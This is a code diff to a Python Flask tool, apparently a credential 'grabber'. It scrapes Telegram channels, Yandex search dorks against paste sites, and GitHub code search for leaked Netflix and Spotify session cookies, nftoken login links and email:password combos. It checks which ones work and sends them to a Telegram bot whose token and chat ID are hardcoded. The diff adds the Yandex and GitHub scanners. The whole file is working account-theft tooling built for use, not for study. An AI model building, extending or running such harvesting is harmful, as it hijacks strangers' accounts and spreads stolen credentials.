@@ -12,7 +12,6 @@ from concurrent.futures import ThreadPoolExecutor
 
 app = Flask(__name__)
 
-# CLOUD BOT TOKEN (GodDrop)
 BOT_TOKEN = '8980059554:AAGi4797fL5HA4HIfFO74HFhEEmt6A2OoUQ'
 CHAT_ID = '6584278242'
 
@@ -39,7 +38,6 @@ TELEGRAM_CHANNELS = [
     "chatgpt_accounts", "openai_accounts", "gaming_drops", "leaked_combos"
 ]
 
-# Sucht nach Links, Cookies und E-Mail:Passwort
 PATTERN = re.compile(
     r'((?:https?://)?(?:www\.)?netflix\.com/(?:tv2|browse)\?nftoken=[^\s<"]+)|((?:NetflixId|SecureNetflixId|sp_dc|sp_key)=[^;\s]+)|([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[^\s]+)',
     re.IGNORECASE
@@ -80,7 +78,6 @@ def test_item(item):
             return True
     except: return False
 
-# HIER IST DIE PERFEKTE NACHRICHT
 def build_telegram_msg(item, platform, key):
     msg = f"🚨 <b>{platform.upper()} FUND</b> 🚨\n\n"
     msg += f"🔑 <b>Key:</b> <code>{key}</code>\n"
@@ -103,7 +100,7 @@ def build_telegram_msg(item, platform, key):
         email, password = item.split(':', 1)
         msg += f"📧 <b>E-Mail:</b> <code>{email}</code>\n"
         msg += f"🔒 <b>Passwort:</b> <code>{password}</code>\n\n"
-        msg += f"📱 <b>Gerät:</b> Funktioniert auf <b>PC, Handy & TV</b> (einfach einloggen)."
+        msg += f"📱 <b>Gerät:</b> Funktioniert auf <b>PC, Handy & TV</b>."
         
     else:
         msg += f"🔗 <b>Direkt-Link:</b> <a href='{item}'>Account öffnen</a>\n"
@@ -121,13 +118,51 @@ def scan_telegram(channel):
     except Exception: pass 
     return found
 
+def scan_yandex(query):
+    found = []
+    try:
+        url = f"https://yandex.com/search/?text={query}"
+        r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
+        if r.status_code == 200:
+            matches = PATTERN.findall(r.text)
+            for m in matches:
+                link = clean_link(m[0] or m[1] or m[2])
+                if link and test_item(link): found.append(link)
+    except Exception: pass
+    return found
+
+def scan_github():
+    found = []
+    try:
+        url = "https://api.github.com/search/code?q=NetflixId="
+        r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/vnd.github.v3+json'}, timeout=10)
+        if r.status_code == 200:
+            data = r.json()
+            for item in data.get('items', []):
+                raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
+                raw_r = requests.get(raw_url, timeout=5)
+                if raw_r.status_code == 200:
+                    matches = PATTERN.findall(raw_r.text)
+                    for m in matches:
+                        link = clean_link(m[0] or m[1] or m[2])
+                        if link and test_item(link): found.append(link)
+    except Exception: pass
+    return found
+
 def grabber_loop():
     while True:
         found_raw = []
+        
         with ThreadPoolExecutor(max_workers=15) as executor:
             results = executor.map(scan_telegram, TELEGRAM_CHANNELS)
             for res in results: found_raw.extend(res)
         
+        found_raw.extend(scan_yandex('site:pastebin.com "NetflixId="'))
+        found_raw.extend(scan_yandex('site:rentry.co "NetflixId="'))
+        found_raw.extend(scan_yandex('"nftoken=" netflix'))
+        found_raw.extend(scan_yandex('site:pastebin.com "sp_dc="'))
+        found_raw.extend(scan_github())
+                
         found_raw = list(set(found_raw)) 
         
         if found_raw:
